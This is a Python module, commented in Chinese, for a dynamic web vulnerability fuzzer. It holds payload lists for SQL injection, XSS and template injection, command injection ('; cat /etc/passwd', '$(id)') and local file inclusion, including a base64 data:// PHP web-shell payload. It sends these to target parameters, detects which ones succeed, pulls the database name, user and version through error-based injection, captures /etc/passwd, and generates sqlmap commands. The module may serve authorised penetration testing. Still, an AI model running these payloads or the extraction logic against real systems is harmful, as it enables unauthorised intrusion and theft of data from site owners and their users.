"""
动态Payload测试器
==================

真正的动态Payload测试，支持：
- 自适应SQL注入测试
- 自适应XSS测试
- 自适应命令注入测试
- 盲注检测与数据提取
- 基于响应的Payload调整
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any, Callable
from datetime import datetime
import re

from .models import (
    HTTPRequest,
    HTTPResponse,
    TestResult,
    VulnerabilityIndicator,
    BlindDetectionResult,
    AttackVector
)
from .http_engine import HTTPInteractionEngine
from .response_analyzer import ResponseAnalyzer

logger = logging.getLogger(__name__)


class DynamicFuzzer:
    """
    真正的动态Payload测试器

    功能：
    - 发送Payload
    - 分析响应
    - 根据响应调整下一个Payload
    - 确认漏洞存在
    - 尝试数据提取
    """

    # ==================== Payload库 ====================

    SQL_PROBE_PAYLOADS = [
        # 基础探测
        "'",
        '"',
        "' OR '1'='1",
        "' OR '1'='2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND 1=1--",
        "' AND 1=2--",

        # 时间盲注探测
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND pg_sleep(5)--",

        # UNION探测
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",

        # 错误触发
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
    ]

    SQL_ERROR_BASED_PAYLOADS = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
    ]

    SQL_UNION_PAYLOADS_TEMPLATE = "' UNION SELECT {columns}--"

    SQL_TIME_BLIND_PAYLOADS = [
        "' AND IF(1=1,SLEEP({delay}),0)--",
        "' AND IF(1=2,SLEEP({delay}),0)--",
        "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--",
        "' AND pg_sleep({delay})--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
    ]

    XSS_PROBE_PAYLOADS = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'>;<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><img src=x onerror=alert(1)>',
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
        "\"><img src=x onerror=alert(1)>",
        "{{7*7}}",  # SSTI探测
        "${7*7}",   # SSTI探测
        "#{7*7}",   # SSTI探测
    ]

    COMMAND_INJECTION_PAYLOADS = [
        # Linux
        "; id",
        "| id",
        "& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",

        # Windows
        "& whoami",
        "| whoami",
        "; whoami",
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
    ]

    LFI_PAYLOADS = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    ]

    def __init__(
        self,
        http_engine: HTTPInteractionEngine,
        analyzer: ResponseAnalyzer,
        learning_engine=None
    ):
        """
        初始化动态测试器

        Args:
            http_engine: HTTP引擎实例
            analyzer: 响应分析器实例
            learning_engine: 学习引擎实例（可选）
        """
        self.http = http_engine
        self.analyzer = analyzer
        self.learner = learning_engine

        # 测试统计
        self.stats = {
            'total_tests': 0,
            'successful_tests': 0,
            'failed_tests': 0,
            'vulnerabilities_found': 0
        }

    async def adaptive_sql_injection(
        self,
        target_url: str,
        parameter: str,
        method: str = "GET",
        body_template: Optional[Dict] = None,
        custom_payloads: Optional[List[str]] = None
    ) -> TestResult:
        """
        自适应SQL注入测试

        流程：
        1. 发送探测Payload
        2. 分析响应特征
        3. 识别注入类型
        4. 针对性深度测试
        5. 尝试数据提取

        Args:
            target_url: 目标URL
            parameter: 测试参数
            method: HTTP方法
            body_template: POST body模板
            custom_payloads: 自定义payload列表

        Returns:
            TestResult: 测试结果
        """
        result = TestResult(
            test_type="sql_injection",
            target=target_url,
            parameter=parameter,
            start_time=datetime.now()
        )

        payloads = custom_payloads or self.SQL_PROBE_PAYLOADS

        try:
            # 阶段1: 获取基线响应
            logger.info(f"[SQLi] 开始测试 {target_url} 参数: {parameter}")
            baseline = await self.http.send_request(target_url, method)
            result.baseline_response = baseline

            # 阶段2: 发送探测Payload
            for payload in payloads:
                result.payloads_tested += 1

                # 注入payload
                test_url, body, _ = self.http.inject_payload(
                    target_url, parameter, payload,
                    injection_point="body" if method == "POST" else "url"
                )

                # 发送请求
                response = await self.http.send_request(
                    test_url,
                    method=method,
                    body=body or body_template
                )

                # 阶段3: 分析响应
                indicators = self.analyzer.analyze_for_sql_injection(response, payload)

                if indicators:
                    # 发现漏洞指标
                    best_indicator = max(indicators, key=lambda x: x.confidence)

                    if best_indicator.confidence >= 0.7:
                        result.vulnerable = True
                        result.vulnerability_type = best_indicator.type
                        result.confidence = best_indicator.confidence
                        result.successful_payload = payload
                        result.vulnerable_response = response

                        # 阶段4: 确定注入类型并深度测试
                        db_type = best_indicator.database_type or "mysql"
                        logger.info(f"[SQLi] 发现漏洞! 类型: {result.vulnerability_type}, 数据库: {db_type}")

                        # 阶段5: 尝试数据提取
                        extracted = await self._extract_sql_data(
                            target_url, parameter, method,
                            result.vulnerability_type, db_type, body_template
                        )
                        if extracted:
                            result.extracted_data = extracted

                        result.poc_command = self._generate_sqlmap_command(
                            target_url, parameter, method
                        )
                        break

                # 检测时间盲注
                if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload:
                    time_diff = response.elapsed_time - baseline.elapsed_time
                    if time_diff >= 4500:  # 4.5秒以上
                        result.vulnerable = True
                        result.vulnerability_type = "sql_injection_blind_time"
                        result.confidence = min(time_diff / 10000, 0.95)
                        result.successful_payload = payload
                        result.vulnerable_response = response
                        logger.info(f"[SQLi] 发现时间盲注! 延迟: {time_diff}ms")
                        break

                # 检测布尔盲注
                diff = self.analyzer.compare_responses(baseline, response)
                if diff.indicates_vulnerability and diff.diff_type == "content":
                    # 进一步验证
                    if "1'='1" in payload or "1=1" in payload:
                        # TRUE条件，应该与基线相似
                        pass
                    elif "1'='2" in payload or "1=2" in payload:
                        # FALSE条件，应该与基线不同
                        if diff.content_diff_ratio > 0.1:
                            result.vulnerable = True
                            result.vulnerability_type = "sql_injection_blind_boolean"
                            result.confidence = diff.confidence
                            result.successful_payload = payload
                            logger.info(f"[SQLi] 可能存在布尔盲注, 差异率: {diff.content_diff_ratio:.2%}")

        except Exception as e:
            result.error = str(e)
            logger.error(f"[SQLi] 测试错误: {e}")

        result.end_time = datetime.now()
        self._update_stats(result)

        return result

    async def adaptive_xss_test(
        self,
        target_url: str,
        parameter: str,
        method: str = "GET",
        context: str = "auto",
        custom_payloads: Optional[List[str]] = None
    ) -> TestResult:
        """
        自适应XSS测试

        Args:
            target_url: 目标URL
            parameter: 测试参数
            method: HTTP方法
            context: 上下文 (html, attribute, javascript, url, auto)
            custom_payloads: 自定义payload列表

        Returns:
            TestResult: 测试结果
        """
        result = TestResult(
            test_type="xss",
            target=target_url,
            parameter=parameter,
            start_time=datetime.now()
        )

        payloads = custom_payloads or self.XSS_PROBE_PAYLOADS

        try:
            logger.info(f"[XSS] 开始测试 {target_url} 参数: {parameter}")

            # 获取基线
            baseline = await self.http.send_request(target_url, method)
            result.baseline_response = baseline

            # 首先发送一个标记来确定反射点
            marker = f"XSSTEST{hash(target_url) % 10000}"
            test_url, body, _ = self.http.inject_payload(
                target_url, parameter, marker,
                injection_point="body" if method == "POST" else "url"
            )
            marker_response = await self.http.send_request(test_url, method, body=body)

            # 检查标记是否被反射
            if marker not in marker_response.text:
                logger.info(f"[XSS] 参数 {parameter} 未被反射")
                result.end_time = datetime.now()
                return result

            # 自动检测上下文
            if context == "auto":
                context = self._detect_xss_context(marker_response.text, marker)
                logger.info(f"[XSS] 检测到上下文: {context}")

            # 根据上下文选择payload
            context_payloads = self._get_context_specific_payloads(context, payloads)

            for payload in context_payloads:
                result.payloads_tested += 1

                test_url, body, _ = self.http.inject_payload(
                    target_url, parameter, payload,
                    injection_point="body" if method == "POST" else "url"
                )

                response = await self.http.send_request(test_url, method, body=body)

                # 分析XSS
                indicators = self.analyzer.analyze_for_xss(response, payload)

                if indicators:
                    best = max(indicators, key=lambda x: x.confidence)
                    if best.confidence >= 0.7:
                        result.vulnerable = True
                        result.vulnerability_type = best.type
                        result.confidence = best.confidence
                        result.successful_payload = payload
                        result.vulnerable_response = response
                        logger.info(f"[XSS] 发现漏洞! 类型: {best.type}")
                        break

                # 检查SSTI
                if "{{7*7}}" in payload and "49" in response.text:
                    result.vulnerable = True
                    result.vulnerability_type = "ssti"
                    result.confidence = 0.90
                    result.successful_payload = payload
                    result.vulnerable_response = response
                    logger.info("[XSS] 发现SSTI漏洞!")
                    break

        except Exception as e:
            result.error = str(e)
            logger.error(f"[XSS] 测试错误: {e}")

        result.end_time = datetime.now()
        self._update_stats(result)

        return result

    async def adaptive_command_injection(
        self,
        target_url: str,
        parameter: str,
        method: str = "GET",
        os_type: str = "auto",
        custom_payloads: Optional[List[str]] = None
    ) -> TestResult:
        """
        自适应命令注入测试

        Args:
            target_url: 目标URL
            parameter: 测试参数
            method: HTTP方法
            os_type: 操作系统类型 (linux, windows, auto)
            custom_payloads: 自定义payload列表

        Returns:
            TestResult: 测试结果
        """
        result = TestResult(
            test_type="command_injection",
            target=target_url,
            parameter=parameter,
            start_time=datetime.now()
        )

        payloads = custom_payloads or self.COMMAND_INJECTION_PAYLOADS

        try:
            logger.info(f"[CMDi] 开始测试 {target_url} 参数: {parameter}")

            # 获取基线
            baseline = await self.http.send_request(target_url, method)
            result.baseline_response = baseline

            for payload in payloads:
                result.payloads_tested += 1

                # 跳过不匹配OS的payload
                if os_type == "linux" and any(w in payload for w in ['whoami', 'ping -n']):
                    continue
                if os_type == "windows" and any(w in payload for w in ['id', '/etc/passwd', 'sleep']):
                    continue

                test_url, body, _ = self.http.inject_payload(
                    target_url, parameter, payload,
                    injection_point="body" if method == "POST" else "url"
                )

                response = await self.http.send_request(test_url, method, body=body)

                # 分析命令注入
                expected_outputs = {
                    'id': r'uid=\d+',
                    'whoami': r'[a-z_][a-z0-9_-]*',
                    '/etc/passwd': r'root:.*:0:0:',
                    'sleep': None,  # 时间检测
                    'ping': None,   # 时间检测
                }

                indicators = self.analyzer.analyze_for_command_injection(
                    response, payload
                )

                if indicators:
                    best = max(indicators, key=lambda x: x.confidence)
                    if best.confidence >= 0.7:
                        result.vulnerable = True
                        result.vulnerability_type = "command_injection"
                        result.confidence = best.confidence
                        result.successful_payload = payload
                        result.vulnerable_response = response
                        logger.info(f"[CMDi] 发现漏洞! OS: {best.os_type}")
                        break

                # 时间检测
                if 'sleep' in payload or 'ping' in payload:
                    time_diff = response.elapsed_time - baseline.elapsed_time
                    if time_diff >= 4500:
                        result.vulnerable = True
                        result.vulnerability_type = "command_injection_blind"
                        result.confidence = min(time_diff / 10000, 0.90)
                        result.successful_payload = payload
                        result.vulnerable_response = response
                        logger.info(f"[CMDi] 发现时间盲注! 延迟: {time_diff}ms")
                        break

        except Exception as e:
            result.error = str(e)
            logger.error(f"[CMDi] 测试错误: {e}")

        result.end_time = datetime.now()
        self._update_stats(result)

        return result

    async def adaptive_lfi_test(
        self,
        target_url: str,
        parameter: str,
        method: str = "GET",
        custom_payloads: Optional[List[str]] = None
    ) -> TestResult:
        """
        自适应LFI测试

        Args:
            target_url: 目标URL
            parameter: 测试参数
            method: HTTP方法
            custom_payloads: 自定义payload列表

        Returns:
            TestResult: 测试结果
        """
        result = TestResult(
            test_type="lfi",
            target=target_url,
            parameter=parameter,
            start_time=datetime.now()
        )

        payloads = custom_payloads or self.LFI_PAYLOADS

        try:
            logger.info(f"[LFI] 开始测试 {target_url} 参数: {parameter}")

            baseline = await self.http.send_request(target_url, method)
            result.baseline_response = baseline

            for payload in payloads:
                result.payloads_tested += 1

                test_url, body, _ = self.http.inject_payload(
                    target_url, parameter, payload,
                    injection_point="body" if method == "POST" else "url"
                )

                response = await self.http.send_request(test_url, method, body=body)

                # 检测LFI成功特征
                lfi_indicators = [
                    (r'root:.*:0:0:', '/etc/passwd', 0.95),
                    (r'\[extensions\]', 'win.ini', 0.90),
                    (r'<\?php', 'PHP source', 0.85),
                    (r'Warning:.*include\(', 'PHP include error', 0.70),
                    (r'No such file or directory', 'Path error', 0.50),
                ]

                for pattern, indicator_type, confidence in lfi_indicators:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        if confidence >= 0.7:
                            result.vulnerable = True
                            result.vulnerability_type = "lfi"
                            result.confidence = confidence
                            result.successful_payload = payload
                            result.vulnerable_response = response
                            logger.info(f"[LFI] 发现漏洞! 指标: {indicator_type}")

                            # 提取文件内容
                            if indicator_type == '/etc/passwd':
                                result.extracted_data = response.text
                            break

                if result.vulnerable:
                    break

        except Exception as e:
            result.error = str(e)
            logger.error(f"[LFI] 测试错误: {e}")

        result.end_time = datetime.now()
        self._update_stats(result)

        return result

    async def fuzz_all_parameters(
        self,
        target_url: str,
        method: str = "GET",
        body: Optional[Dict] = None,
        test_types: Optional[List[str]] = None
    ) -> List[TestResult]:
        """
        对所有参数进行模糊测试

        Args:
            target_url: 目标URL
            method: HTTP方法
            body: POST body
            test_types: 测试类型列表

        Returns:
            List[TestResult]: 所有测试结果
        """
        results = []
        test_types = test_types or ['sql_injection', 'xss', 'command_injection', 'lfi']

        # 获取页面并提取参数
        response = await self.http.send_request(target_url, method, body=body)
        parameters = self.analyzer.extract_parameters(response)

        # 从URL提取参数
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(target_url)
        url_params = list(parse_qs(parsed.query).keys())
        parameters = list(set(parameters + url_params))

        logger.info(f"[Fuzzer] 发现 {len(parameters)} 个参数: {parameters}")

        for param in parameters:
            for test_type in test_types:
                if test_type == 'sql_injection':
                    result = await self.adaptive_sql_injection(target_url, param, method, body)
                elif test_type == 'xss':
                    result = await self.adaptive_xss_test(target_url, param, method)
                elif test_type == 'command_injection':
                    result = await self.adaptive_command_injection(target_url, param, method)
                elif test_type == 'lfi':
                    result = await self.adaptive_lfi_test(target_url, param, method)
                else:
                    continue

                results.append(result)

                # 如果发现漏洞，记录日志
                if result.vulnerable:
                    logger.warning(
                        f"[Fuzzer] 发现漏洞! 参数: {param}, "
                        f"类型: {result.vulnerability_type}, "
                        f"置信度: {result.confidence:.2%}"
                    )

        return results

    async def _extract_sql_data(
        self,
        target_url: str,
        parameter: str,
        method: str,
        vuln_type: str,
        db_type: str,
        body_template: Optional[Dict]
    ) -> Optional[Dict]:
        """尝试提取SQL数据"""
        extracted = {}

        if vuln_type == "sql_injection_error":
            # 尝试错误注入提取
            payloads = {
                "database": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
                "user": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
                "version": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            }

            for key, payload in payloads.items():
                test_url, body, _ = self.http.inject_payload(
                    target_url, parameter, payload,
                    injection_point="body" if method == "POST" else "url"
                )
                response = await self.http.send_request(test_url, method, body=body)

                # 提取~之间的数据
                match = re.search(r'~([^~]+)~', response.text)
                if match:
                    extracted[key] = match.group(1)

        return extracted if extracted else None

    def _detect_xss_context(self, html: str, marker: str) -> str:
        """检测XSS上下文"""
        marker_pos = html.find(marker)
        if marker_pos == -1:
            return "html"

        # 获取标记周围的内容
        start = max(0, marker_pos - 100)
        end = min(len(html), marker_pos + len(marker) + 100)
        context_text = html[start:end]

        # 检查是否在属性中
        if re.search(r'["\'][^"\']*' + marker, context_text):
            return "attribute"

        # 检查是否在script标签中
        if '<script' in html[:marker_pos].lower() and '</script>' not in html[:marker_pos].lower():
            return "javascript"

        # 检查是否在URL中
        if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*' + marker, context_text, re.IGNORECASE):
            return "url"

        return "html"

    def _get_context_specific_payloads(
        self,
        context: str,
        base_payloads: List[str]
    ) -> List[str]:
        """根据上下文获取特定payload"""
        if context == "attribute":
            return [
                '"><script>alert(1)</script>',
                "' onmouseover='alert(1)'",
                '" onfocus="alert(1)" autofocus="',
                "' onclick='alert(1)'",
            ] + base_payloads

        elif context == "javascript":
            return [
                "';alert(1)//",
                '";alert(1)//',
                "</script><script>alert(1)</script>",
                "'-alert(1)-'",
            ] + base_payloads

        elif context == "url":
            return [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ] + base_payloads

        return base_payloads

    def _generate_sqlmap_command(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> str:
        """生成sqlmap命令"""
        cmd = f"sqlmap -u \"{url}\""
        if method == "POST":
            cmd += f" --data=\"{parameter}=test\""
        else:
            cmd += f" -p {parameter}"
        cmd += " --batch --random-agent"
        return cmd

    def _update_stats(self, result: TestResult):
        """更新统计"""
        self.stats['total_tests'] += 1
        if result.vulnerable:
            self.stats['successful_tests'] += 1
            self.stats['vulnerabilities_found'] += 1
        elif result.error:
            self.stats['failed_tests'] += 1

        # 记录到学习引擎
        if self.learner and hasattr(self.learner, 'record_test'):
            self.learner.record_test(result)

    def get_stats(self) -> Dict[str, Any]:
        """获取测试统计"""
        return self.stats.copy()
